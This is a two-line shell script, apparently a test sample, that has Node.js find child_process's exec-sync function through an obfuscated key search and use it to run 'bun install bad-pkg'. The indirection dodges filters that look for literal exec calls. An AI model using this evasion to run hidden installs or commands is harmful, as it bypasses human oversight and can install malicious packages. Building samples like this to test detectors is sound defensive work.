#!/bin/sh
node -e 'const cp = require("child_process"); cp[Object.keys(cp).find(k => k.includes("Sync") && k.includes("exec"))]("bun install bad-pkg")'
